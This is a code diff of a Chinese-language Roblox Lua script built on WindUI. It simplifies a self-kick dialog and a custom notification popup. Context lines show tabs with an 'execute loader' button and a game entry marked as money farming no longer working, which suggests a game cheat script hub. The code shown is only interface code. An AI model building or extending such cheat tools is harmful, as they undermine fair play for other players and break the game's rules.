-        contentBox.TextSize = 14
-        contentBox.TextWrapped = true
-        contentBox.ClearTextOnFocus = false
-        Instance.new("UICorner", contentBox).CornerRadius = UDim.new(0, 6)
-        local codeLabel = Instance.new("TextLabel")
-        codeLabel.Parent = bg
-        codeLabel.Size = UDim2.new(1, -20, 0, 20)
-        codeLabel.Position = UDim2.new(0, 10, 0, 185)
-        codeLabel.BackgroundTransparency = 1
-        codeLabel.Text = "错误代码 (可选):"
-        codeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        codeLabel.Font = Enum.Font.SourceSans
-        codeLabel.TextSize = 14
-        codeLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local codeBox = Instance.new("TextBox")
-        codeBox.Parent = bg
-        codeBox.Size = UDim2.new(1, -20, 0, 25)
-        codeBox.Position = UDim2.new(0, 10, 0, 205)
-        codeBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        codeBox.Text = "267"
-        codeBox.TextColor3 = Color3.new(1, 1, 1)
-        codeBox.Font = Enum.Font.SourceSans
-        codeBox.TextSize = 14
-        Instance.new("UICorner", codeBox).CornerRadius = UDim.new(0, 6)
-        local kickBtn = Instance.new("TextButton")
-        kickBtn.Parent = bg
-        kickBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        kickBtn.Position = UDim2.new(0.05, 0, 0, 240)
-        kickBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-        kickBtn.Text = "执行踢出"
-        kickBtn.TextColor3 = Color3.new(1, 1, 1)
-        kickBtn.Font = Enum.Font.SourceSansBold
-        kickBtn.TextSize = 16
-        Instance.new("UICorner", kickBtn).CornerRadius = UDim.new(0, 6)
-        kickBtn.MouseButton1Click:Connect(function()
-            local kickTitle = titleBox.Text
-            local kickContent = contentBox.Text
-            local kickCode = tonumber(codeBox.Text) or 267
-            kickGui:Destroy()
-            LocalPlayer:Kick(kickContent)
-        end)
-        local closeBtn = Instance.new("TextButton")
-        closeBtn.Parent = bg
-        closeBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        closeBtn.Position = UDim2.new(0.5, 0, 0, 240)
-        closeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        closeBtn.Text = "取消"
-        closeBtn.TextColor3 = Color3.new(1, 1, 1)
-        closeBtn.Font = Enum.Font.SourceSansBold
-        closeBtn.TextSize = 16
-        Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
-        closeBtn.MouseButton1Click:Connect(function() kickGui:Destroy() end)
+        LocalPlayer:Kick(kickContent)
     end
 })
 
-Tabs.MiscTab:Button({
-    Title = "自定义确认弹窗",
-    Callback = function()
-        local confirmGui = Instance.new("ScreenGui")
-        confirmGui.Name = "CustomConfirmGui"
-        confirmGui.Parent = LocalPlayer.PlayerGui
-        confirmGui.IgnoreGuiInset = true
-        confirmGui.ResetOnSpawn = false
-        confirmGui.DisplayOrder = 999
-        local bg = Instance.new("Frame")
-        bg.Parent = confirmGui
-        bg.Size = UDim2.new(0, 320, 0, 260)
-        bg.Position = UDim2.new(0.5, -160, 0.5, -130)
-        bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-        Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 12)
-        local title = Instance.new("TextLabel")
-        title.Parent = bg
-        title.Size = UDim2.new(1, 0, 0, 35)
-        title.Position = UDim2.new(0, 0, 0, 5)
-        title.BackgroundTransparency = 1
-        title.Text = "自定义确认弹窗"
-        title.TextColor3 = Color3.new(1, 1, 1)
-        title.Font = Enum.Font.SourceSansBold
-        title.TextSize = 20
-        local titleLabel = Instance.new("TextLabel")
-        titleLabel.Parent = bg
-        titleLabel.Size = UDim2.new(1, -20, 0, 20)
-        titleLabel.Position = UDim2.new(0, 10, 0, 45)
-        titleLabel.BackgroundTransparency = 1
-        titleLabel.Text = "弹窗标题:"
-        titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        titleLabel.Font = Enum.Font.SourceSans
-        titleLabel.TextSize = 14
-        titleLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local titleBox = Instance.new("TextBox")
-        titleBox.Parent = bg
-        titleBox.Size = UDim2.new(1, -20, 0, 30)
-        titleBox.Position = UDim2.new(0, 10, 0, 65)
-        titleBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        titleBox.Text = "确认操作"
-        titleBox.TextColor3 = Color3.new(1, 1, 1)
-        titleBox.Font = Enum.Font.SourceSans
-        titleBox.TextSize = 16
-        Instance.new("UICorner", titleBox).CornerRadius = UDim.new(0, 6)
-        local contentLabel = Instance.new("TextLabel")
-        contentLabel.Parent = bg
-        contentLabel.Size = UDim2.new(1, -20, 0, 20)
-        contentLabel.Position = UDim2.new(0, 10, 0, 100)
-        contentLabel.BackgroundTransparency = 1
-        contentLabel.Text = "弹窗内容:"
-        contentLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-        contentLabel.Font = Enum.Font.SourceSans
-        contentLabel.TextSize = 14
-        contentLabel.TextXAlignment = Enum.TextXAlignment.Left
-        local contentBox = Instance.new("TextBox")
-        contentBox.Parent = bg
-        contentBox.Size = UDim2.new(1, -20, 0, 60)
-        contentBox.Position = UDim2.new(0, 10, 0, 120)
-        contentBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-        contentBox.Text = "你确定要执行此操作吗？"
-        contentBox.TextColor3 = Color3.new(1, 1, 1)
-        contentBox.Font = Enum.Font.SourceSans
-        contentBox.TextSize = 14
-        contentBox.TextWrapped = true
-        contentBox.ClearTextOnFocus = false
-        Instance.new("UICorner", contentBox).CornerRadius = UDim.new(0, 6)
-        local confirmBtn = Instance.new("TextButton")
-        confirmBtn.Parent = bg
-        confirmBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        confirmBtn.Position = UDim2.new(0.05, 0, 0, 200)
-        confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-        confirmBtn.Text = "确认并弹出"
-        confirmBtn.TextColor3 = Color3.new(1, 1, 1)
-        confirmBtn.Font = Enum.Font.SourceSansBold
-        confirmBtn.TextSize = 16
-        Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 6)
-        confirmBtn.MouseButton1Click:Connect(function()
-            local cTitle = titleBox.Text
-            local cContent = contentBox.Text
-            confirmGui:Destroy()
-            WindUI:Notify({ Title = cTitle, Content = cContent, Duration = 10 })
-        end)
-        local closeBtn = Instance.new("TextButton")
-        closeBtn.Parent = bg
-        closeBtn.Size = UDim2.new(0.45, 0, 0, 30)
-        closeBtn.Position = UDim2.new(0.5, 0, 0, 200)
-        closeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
-        closeBtn.Text = "取消"
-        closeBtn.TextColor3 = Color3.new(1, 1, 1)
-        closeBtn.Font = Enum.Font.SourceSansBold
-        closeBtn.TextSize = 16
-        Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
-        closeBtn.MouseButton1Click:Connect(function() confirmGui:Destroy() end)
+local confirmTitle, confirmContent = "确认操作", "你确定要执行此操作吗？"
+Tabs.MiscTab:Input({
+    Title = "弹窗标题",
+    Placeholder = "输入弹窗标题",
+    Callback = function(v)
+        if v and v ~= "" then confirmTitle = v end
     end
 })
+Tabs.MiscTab:Input({
+    Title = "弹窗内容",
+    Placeholder = "输入弹窗内容",
+    Callback = function(v)
+        if v and v ~= "" then confirmContent = v end
+    end
+})
+Tabs.MiscTab:Button({
+    Title = "弹出确认窗口",
+    Callback = function()
+        WindUI:Notify({ Title = confirmTitle, Content = confirmContent, Duration = 10 })
+    end
+})
+
 
 Tabs.GamesTab:Button({
     Title = "执行加载器",
@@ -2779,7 +2443,7 @@ Tabs.GamesTab:Button({
 })
 
 Tabs.GamesTab:Button({
-    Title = "圣地亚哥边境",
+    Title = "圣地亚哥边境（刷钱失效）",
     Callback = function()
         WindUI:Notify({ Title = "圣地亚哥边境", Content = "正在加载中...", Duration = 5 })
         task.spawn(function()
